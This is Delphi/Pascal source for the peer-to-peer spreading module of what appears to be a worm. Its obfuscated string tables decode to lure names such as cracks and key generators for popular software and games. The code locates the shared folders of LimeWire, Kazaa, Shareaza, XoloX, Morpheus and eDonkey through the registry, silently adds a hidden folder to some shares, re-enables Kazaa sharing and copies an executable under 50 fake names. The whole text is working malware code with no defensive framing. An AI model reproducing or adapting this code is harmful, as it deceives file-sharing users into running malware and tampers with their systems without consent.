UNIT P2P;

INTERFACE

USES
  Registry, Utils;

PROCEDURE InitPeerToPeer;
PROCEDURE SetWinPath;

VAR
  Reg     : TRegistry;
  WinPath : STRING;

IMPLEMENTATION

VAR
  Fake              : ARRAY [1..50] OF STRING;
  FakeFiles         : XArray;
  Addon             : XArray;
  NumberOfFakeFiles : WORD;
  NumberOfAddon     : WORD;

CONST
  SysConfigDir = 'Drivers';

  TFakeFiles : pChar =
                    #167+#175+#189+#151+#132+#145+#132+#166+#197+#209+#132+#177+
                    #197+#214+#203+#201+#214+#197+#132+#187+#211+#214+#208+#200+
                    #132+#173+#210+#200+#217+#215+#216+#214+#205+#201+#215+#132+
                    #165+#208+#205+#201+#210+#132+#187+#211+#214+#207+#215+#204+
                    #211+#212+#144+#167+#197+#216+#132+#165+#216+#216+#197+#199+
                    #207+#215+#132+#167+#204+#205+#208+#200+#144+#187+#205+#210+
                    #200+#211+#219+#215+#132+#188+#180+#144+#165+#173+#177+#132+
                    #165+#199+#199+#211+#217+#210+#216+#132+#183+#216+#201+#197+
                    #208+#201+#214+#144+#177+#183+#178+#132+#180+#197+#215+#215+
                    #219+#211+#214+#200+#132+#172+#197+#199+#207+#201+#214+#132+
                    #197+#210+#200+#132+#183+#216+#201+#197+#208+#201+#214+#144+
                    #172+#197+#199+#207+#205+#210+#203+#132+#184+#211+#211+#208+
                    #132+#167+#211+#208+#208+#201+#199+#216+#205+#211+#210+#144+
                    #177+#197+#199+#214+#211+#209+#201+#200+#205+#197+#132+#170+
                    #208+#197+#215+#204+#132+#153+#146+#148+#144+#168+#183+#176+
                    #132+#177+#211+#200+#201+#209+#132+#185+#210+#199+#197+#212+
                    #212+#201+#214+#144+#173+#210+#216+#201+#214+#210+#201+#216+
                    #132+#197+#210+#200+#132+#167+#211+#209+#212+#217+#216+#201+
                    #214+#132+#183+#212+#201+#201+#200+#132+#166+#211+#211+#215+
                    #216+#201+#214+#144+#190+#211+#210+#201+#165+#208+#197+#214+
                    #209+#132+#170+#205+#214+#201+#219+#197+#208+#208+#144+#166+
                    #211+#214+#208+#197+#210+#200+#132+#168+#201+#208+#212+#204+
                    #205+#132+#154+#144+#166+#179+#182+#176+#165+#178+#168+#132+
                    #168+#201+#208+#212+#204+#205+#132+#155+#144+#183+#204+#197+
                    #207+#205+#214+#197+#144+#171+#208+#197+#200+#205+#197+#216+
                    #211+#214+#144+#165+#205+#207+#197+#181+#217+#201+#215+#216+
                    #151+#172+#201+#210+#216+#197+#205+#144+#177+#211+#218+#205+
                    #201+#222+#167+#204+#197+#210+#210+#201+#208+#215+#173+#210+
                    #215+#216+#197+#208+#201+#214+#144+#190+#205+#200+#197+#210+
                    #201+#145+#183+#199+#214+#201+#201+#210+#173+#210+#215+#216+
                    #197+#208+#201+#214+#144+#176+#211+#214+#200+#179+#202+#184+
                    #204+#201+#182+#205+#210+#203+#215+#214+#144+#183+#173+#177+
                    #183+#144+#181+#217+#197+#207+#201+#132+#152+#132+#166+#169+
                    #184+#165+#144+#188+#198+#211+#220+#146+#205+#210+#202+#211+
                    #144+#171+#184+#165+#151+#144+#166+#197+#216+#216+#208+#201+
                    #146+#210+#201+#216+#144+#187+#197+#214+#199+#214+#197+#202+
                    #216+#132+#151+#132+#198+#197+#216+#216+#208+#201+#146+#210+
                    #201+#216+#144+#172+#197+#208+#202+#145+#208+#205+#202+#201+
                    #132+#187+#179+#178+#144+#187+#205+#210+#222+#205+#212+#132+
                    #156+#146+#148+#144+#187+#205+#210+#214+#197+#214+#132+#151+
                    #146+#150+#144+#187+#197+#214+#199+#214+#197+#202+#216+#132+
                    #151+#132+#179+#178+#176+#173+#178+#169+#144+#172+#197+#208+
                    #202+#145+#208+#205+#202+#201+#132+#179+#178+#176+#173+#178+
                    #169+#144+#171+#214+#197+#210+#200+#132+#184+#204+#201+#202+
                    #216+#132+#165+#217+#216+#211+#132+#151+#144+#177+#197+#199+
                    #214+#211+#209+#201+#200+#205+#197+#144+#175+#197+#190+#197+
                    #165+#132+#177+#201+#200+#205+#197+#132+#168+#201+#215+#207+
                    #216+#211+#212+#132+#218+#150+#146+#153+#132+#185+#178+#179+
                    #170+#170+#173+#167+#173+#165+#176+#144+#175+#197+#190+#197+
                    #165+#132+#183+#212+#221+#219+#197+#214+#201+#132+#182+#201+
                    #209+#211+#218+#201+#214+#144+#165+#203+#201+#132+#179+#202+
                    #132+#169+#209+#212+#205+#214+#201+#215+#132+#150+#144+#178+
                    #211+#214+#216+#211+#210+#132+#165+#210+#216+#205+#186+#205+
                    #214+#217+#215+#132+#150+#148+#148+#150+#144+#177+#197+#199+
                    #214+#211+#209+#201+#200+#205+#197+#132+#168+#214+#201+#197+
                    #209+#219+#201+#197+#218+#201+#214+#132+#177+#188+#144+#177+
                    #205+#199+#214+#211+#215+#211+#202+#216+#132+#179+#202+#202+
                    #205+#199+#201+#132+#188+#180+#132+#140+#169+#210+#203+#208+
                    #205+#215+#204+#141+#144+#167+#208+#211+#210+#201+#167+#168+
                    #144+#187+#205+#210+#200+#211+#219+#215+#132+#188+#180+#132+
                    #183+#180+#149+#144+#184+#204+#201+#132+#178+#201+#218+#201+
                    #214+#201+#210+#200+#205+#210+#203+#132+#183+#216+#211+#214+
                    #221+#132+#180+#197+#214+#216+#132+#173+#144+#170+#214+#201+
                    #201+#132+#186+#205+#214+#217+#215+#132+#182+#201+#209+#211+
                    #218+#197+#208+#132+#184+#211+#211+#208+#132+#170+#214+#211+
                    #209+#132+#183+#221+#209+#197+#210+#216+#201+#199+#144+#184+
                    #204+#201+#132+#183+#217+#210+#132+#179+#202+#132+#165+#208+
                    #208+#132+#170+#201+#197+#214+#215+#144+#167+#214+#197+#222+
                    #221+#132+#184+#197+#220+#205+#144+#168+#217+#207+#201+#132+
                    #178+#217+#207+#201+#209+#132+#177+#197+#210+#204+#197+#216+
                    #216+#197+#210+#132+#180+#214+#211+#206+#201+#199+#216+#144+
                    #173+#210+#200+#217+#215+#216+#214+#221+#132+#171+#205+#197+
                    #210+#216+#132+#150+#144+#170+#149+#132+#171+#214+#197+#210+
                    #200+#132+#180+#205+#220+#132+#152+#144+#183+#216+#197+#214+
                    #132+#187+#197+#214+#215+#132+#173+#173+#132+#177+#211+#218+
                    #205+#201+#144+#178+#201+#214+#211+#132+#166+#217+#214+#210+
                    #205+#210+#203+#132+#182+#211+#209+#132+#153+#146+#156+#146+
                    #148+#146+#149+#144+#178+#201+#201+#200+#132+#170+#211+#214+
                    #132+#183+#212+#201+#201+#200+#132+#153+#132+#180+#211+#214+
                    #215+#199+#204+#201+#132+#185+#210+#208+#201+#197+#215+#204+
                    #201+#200+#144+#172+#197+#208+#202+#132+#176+#205+#202+#201+
                    #132+#166+#208+#217+#201+#132+#183+#204+#205+#202+#216+#144+
                    #181+#217+#197+#207+#201+#132+#151+#132+#165+#214+#201+#210+
                    #197+#144+#187+#197+#214+#199+#214+#197+#202+#216+#132+#151+
                    #144+#167+#205+#218+#205+#208+#205+#222+#197+#216+#205+#211+
                    #210+#132+#151+#144+#166+#208+#197+#199+#207+#132+#165+#210+
                    #200+#132+#187+#204+#205+#216+#201+#144+#183+#216+#214+#205+
                    #207+#201+#132+#170+#205+#203+#204+#216+#201+#214+#132+#180+
                    #214+#211+#206+#201+#199+#216+#132+#149+#144+#177+#197+#202+
                    #205+#197+#144+#184+#204+#201+#132+#169+#221+#201+#132+#179+
                    #202+#132+#175+#214+#197+#207+#201+#210+#144+#172+#211+#221+
                    #208+#201+#132+#167+#197+#214+#200+#132+#171+#197+#209+#201+
                    #215+#132+#150+#148+#148+#151+#144+#171+#184+#165+#132+#151+
                    #144+#172+#197+#214+#200+#132+#184+#214+#217+#199+#207+#132+
                    #149+#156+#132+#187+#204+#201+#201+#208+#215+#132+#211+#202+
                    #132+#183+#216+#201+#201+#208+#144+#167+#211+#209+#197+#210+
                    #199+#204+#201+#132+#152+#144+#171+#214+#197+#210+#200+#132+
                    #180+#214+#205+#220+#132+#152+#144+#165+#203+#201+#132+#211+
                    #202+#132+#183+#197+#205+#208+#132+#150+#144+#183+#217+#200+
                    #200+#201+#210+#132+#183+#216+#214+#205+#207+#201+#132+#150+
                    #144+#178+#201+#218+#201+#214+#219+#205+#210+#216+#201+#214+
                    #132+#178+#205+#203+#204+#216+#215+#144+#183+#211+#208+#200+
                    #205+#201+#214+#132+#179+#202+#132+#170+#211+#214+#216+#217+
                    #210+#201+#132+#150+#144+#186+#197+#208+#204+#197+#208+#208+
                    #197+#132+#167+#204+#214+#211+#210+#205+#199+#208+#201+#215+
                    #144+#173+#210+#216+#201+#214+#210+#197+#216+#205+#211+#210+
                    #197+#208+#132+#167+#214+#205+#199+#207+#201+#216+#132+#167+
                    #197+#212+#216+#197+#205+#210+#132+#150+#148+#148+#151+#144+
                    #167+#214+#205+#216+#205+#199+#197+#208+#132+#180+#211+#205+
                    #210+#216+#132+#177+#197+#210+#203+#197+#132+#203+#197+#209+
                    #201+#144+#169+#208+#200+#201+#214+#132+#183+#199+#214+#211+
                    #208+#208+#215+#132+#173+#173+#173+#132+#177+#211+#214+#214+
                    #211+#219+#205+#210+#200+#132+#184+#172+#188+#132+#166+#214+
                    #214+#198+#214+#214+#144+#185+#210+#214+#201+#197+#208+#132+
                    #184+#211+#217+#214+#210+#197+#209+#201+#210+#216+#132+#151+
                    #144+#165+#208+#205+#201+#210+#215+#132+#218+#201+#214+#215+
                    #217+#215+#132+#180+#214+#201+#200+#197+#216+#211+#214+#132+
                    #150+#132+#180+#214+#205+#209+#197+#208+#132+#172+#217+#210+
                    #216+#144+#183+#216+#197+#214+#132+#187+#197+#214+#215+#132+
                    #183+#216+#197+#214+#202+#205+#203+#204+#216+#201+#214+#144+
                    #178+#211+#214+#216+#211+#210+#132+#185+#216+#205+#208+#205+
                    #216+#205+#201+#215+#132+#150+#148+#148+#150+#132+#188+#180+
                    #144+#172+#205+#216+#209+#197+#210+#132+#150+#132+#183+#205+
                    #208+#201+#210+#216+#132+#165+#215+#215+#197+#215+#215+#205+
                    #210+#144+#177+#183+#132+#184+#214+#197+#205+#210+#132+#183+
                    #205+#209+#217+#208+#197+#216+#211+#214+#144+#167+#197+#198+
                    #201+#208+#197+#215+#132+#185+#208+#216+#205+#209+#197+#216+
                    #201+#132+#168+#201+#201+#214+#132+#172+#217+#210+#216+#132+
                    #150+#144+#168+#219+#201+#201+#198+#215+#132+#150+#144+#165+
                    #203+#201+#132+#179+#202+#132+#187+#211+#210+#200+#201+#214+
                    #215+#132+#150+#144+#165+#217+#215+#216+#201+#214+#208+#205+
                    #216+#222+#132+#178+#197+#212+#211+#208+#201+#211+#210+#215+
                    #132+#171+#214+#201+#197+#216+#201+#215+#216+#132+#186+#205+
                    #199+#216+#211+#214+#221+#144+#169+#209+#212+#201+#214+#211+
                    #214+#132+#182+#205+#215+#201+#132+#179+#202+#132+#216+#204+
                    #201+#132+#177+#205+#200+#200+#208+#201+#132+#175+#205+#210+
                    #203+#200+#211+#209+#144+#178+#201+#199+#214+#211+#209+#197+
                    #210+#205+#197+#132+#184+#214+#197+#212+#132+#179+#202+#132+
                    #168+#197+#214+#207+#210+#201+#215+#215+#144+#180+#214+#205+
                    #215+#211+#210+#201+#214+#132+#179+#202+#132+#187+#197+#214+
                    #144+#183+#213+#217+#197+#200+#132+#166+#197+#216+#216+#208+
                    #201+#215+#132+#169+#197+#203+#208+#201+#215+#132+#183+#216+
                    #214+#205+#207+#201+#144+#183+#216+#214+#211+#210+#203+#204+
                    #211+#208+#200+#132+#167+#214+#217+#215+#197+#200+#201+#214+
                    #144+#184+#211+#209+#198+#132+#182+#197+#205+#200+#201+#214+
                    #132+#151+#144+#168+#201+#197+#200+#208+#221+#132+#168+#211+
                    #222+#201+#210+#144+#169+#209+#212+#205+#214+#201+#132+#169+
                    #197+#214+#216+#204+#144+#170+#214+#201+#201+#200+#211+#209+
                    #132+#170+#211+#214+#199+#201+#144+#171+#201+#197+#214+#204+
                    #201+#197+#200+#132+#171+#197+#214+#197+#203+#201+#144+#182+
                    #201+#200+#132+#165+#199+#201+#132+#183+#213+#217+#197+#200+
                    #214+#211+#210+#144+#167+#208+#205+#218+#201+#132+#166+#197+
                    #214+#207+#201+#214+#246+#215+#132+#185+#210+#200+#221+#205+
                    #210+#203+#144+#184+#204+#201+#132+#184+#204+#205+#210+#203+
                    #144+#168+#197+#214+#207+#132+#165+#203+#201+#132+#179+#202+
                    #132+#167+#197+#209+#201+#208+#211+#216+#132+#183+#204+#214+
                    #211+#217+#200+#201+#200+#132+#173+#215+#208+#201+#215+#144+
                    #167+#211+#209+#198+#197+#216+#132+#170+#208+#205+#203+#204+
                    #216+#132+#183+#205+#209+#217+#208+#197+#216+#211+#214+#132+
                    #151+#144+#183+#211+#208+#200+#205+#201+#214+#215+#132+#179+
                    #202+#132+#165+#210+#197+#214+#199+#204+#221+#144+#170+#173+
                    #170+#165+#132+#150+#148+#148+#151;

  TAddon : pChar =  #167+#214+#197+#199+#207+#144+#180+#197+#216+#199+#204+#144+
                    #175+#201+#221+#132+#171+#201+#210+#201+#214+#197+#216+#211+
                    #214+#144+#170+#217+#208+#208+#132+#168+#211+#219+#210+#208+
                    #211+#197+#200+#201+#214+#144+#173+#183+#179+#132+#145+#132+
                    #170+#217+#208+#208+#132+#168+#211+#219+#210+#208+#211+#197+
                    #200+#201+#214+#144+#168+#211+#219+#210+#208+#211+#197+#200+
                    #201+#214;

PROCEDURE RandomFileName;
VAR
  S      : STRING;
  I      : BYTE;
  J      : BYTE;
  Double : BOOL;
BEGIN
  I:=0;
  REPEAT
    Double:=False;
    S:=FakeFiles[Random(NumberOfFakeFiles-1)+1]+' '+Addon[Random(NumberOfAddon-1)+1]+'.exe';
    FOR J:=1 TO I+1 DO IF S=Fake[J] THEN Double:=True;
    IF NOT Double THEN BEGIN
      Inc(I);
      Fake[I]:=S;
    END;
  UNTIL I=50;
END;

PROCEDURE SetWinPath;
VAR
  PWindowsDir : ARRAY [0..255] OF Char;
BEGIN
  GetWindowsDirectory(PWindowsDir,255);
  WinPath:=STRING(PWindowsDir)+'\';
END;

PROCEDURE MakeFakeFiles(SharedDir:STRING);
VAR
  I : WORD;
BEGIN
  If SharedDir<>'' THEN BEGIN
    RandomFileName;
    CreateDir(SharedDir,0);
    SetFileAttributes(pchar(SharedDir),FILE_ATTRIBUTE_HIDDEN);
    FOR I:=1 TO 50 DO CopyFiles(False,SharedDir+'\'+Fake[I]);
  END;
END;

////////////////////////////////\EDONKEY/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindEDonkey : BOOL;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  RESULT:=Reg.KeyExists(Software+'ed2k');
  Reg.CloseKey;
END;

FUNCTION EDonkeyShare : STRING;
VAR
  I : WORD;
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(SoftwareMic+'Windows\CurrentVersion\Uninstall\eDonkey2000',False);
  S:=Reg.ReadString('UninstallString');
  I:=Pos('uninstall',S);
  IF I>0 THEN BEGIN
    Delete(S,I-1,Length(S));
    Delete(S,1,1);
    RESULT:=S+'\incoming';
  END;
  Reg.CloseKey;
END;

/////////////////////////////////\MORPHEUS/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindMorpheus : BOOL;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  RESULT:=Reg.KeyExists(Software+'Morpheus');
  Reg.CloseKey;
END;

FUNCTION MorpheusShare : STRING;
VAR
  I : WORD;
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(SoftwareMic+'Windows\CurrentVersion\Uninstall\Morpheus 2.0',False);
  S:=Reg.ReadString('UninstallString');
  I:=Pos('UNWISE.EXE',S);
  IF I>0 THEN BEGIN
    Delete(S,I-1,Length(S));
    RESULT:=S+'\My Shared Folder';
  END;
  Reg.CloseKey;
END;

//////////////////////////////////\XOLOX/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindXoloX : BOOL;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  RESULT:=Reg.KeyExists(Software+'Xolox');
  Reg.CloseKey;
END;

FUNCTION XoloxShare : STRING;
VAR
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(Software+'Xolox',False);
  S:=Reg.ReadString('shareddirs');
  IF Pos(WinPath+SysConfigDir,S)=0 THEN Reg.WriteString('shareddirs',S+'|'+WinPath+SysConfigDir+'\');
  Reg.CloseKey;
  RESULT:=WinPath+SysConfigDir;
END;

///////////////////////////////////\KAZAA/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindKazaa : BOOL;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  RESULT:=Reg.KeyExists(Software+'Kazaa');
  Reg.CloseKey;
END;

FUNCTION KazaaShare : STRING;
VAR
  Dir : STRING;
  I   : WORD;
  S   : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(Software+'Kazaa\LocalContent',True);
  I:=0;
  REPEAT
    Str(I,Dir);
    Dir:='Dir'+Dir;
    Inc(I);
    S:=Reg.ReadString(Dir);
  UNTIL (S='')or(Pos(SysConfigDir,S)>0);
  IF S='' THEN Reg.WriteString(Dir,'012345:'+WinPath+SysConfigDir);             // <- Create Dir to Fake Files
  Reg.WriteInteger('DisableSharing',0);                                         // <- Enable File Sharing
  Reg.CloseKey;
  RESULT:=WinPath+SysConfigDir;
END;

/////////////////////////////////\SHAREAZA/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindShareaza : BOOL;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  RESULT:=Reg.KeyExists(Software+'Shareaza');
  Reg.CloseKey;
END;

FUNCTION ShareazaShare : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(Software+'Shareaza\Shareaza\Transfers',False);
  RESULT:=Reg.ReadString('DownloadsPath');
  Reg.CloseKey;
END;

/////////////////////////////////\LIMEWIRE/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

FUNCTION FindLimeWire : BOOL;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  RESULT:=Reg.KeyExists(Software+'LimeWire');
  Reg.CloseKey;
END;

FUNCTION LimeWireShare : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(Software+'LimeWire',False);
  RESULT:=Reg.ReadString('InstallDir')+'\Shared';
  Reg.CloseKey;
END;

///////////////////////////////////\INIT/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

PROCEDURE InitPeerToPeer;
BEGIN
  NumberOfFakeFiles:=DecodeStrings(TFakeFiles,FakeFiles);
  NumberOfAddon:=DecodeStrings(TAddon,Addon);
  Randomize;
  Reg:=TRegistry.Create;
  MakeFakeFiles('C:\My Downloads');
  IF FindLimeWire THEN MakeFakeFiles(LimeWireShare);
  IF FindShareaza THEN MakeFakeFiles(ShareazaShare);
  IF FindKazaa THEN MakeFakeFiles(KazaaShare);
  IF FindXolox THEN MakeFakeFiles(XoloXShare);
  IF FindMorpheus THEN MakeFakeFiles(MorpheusShare);
  IF FindEdonkey THEN MakeFakeFiles(EdonkeyShare);
  Reg.Free;
END;

END.
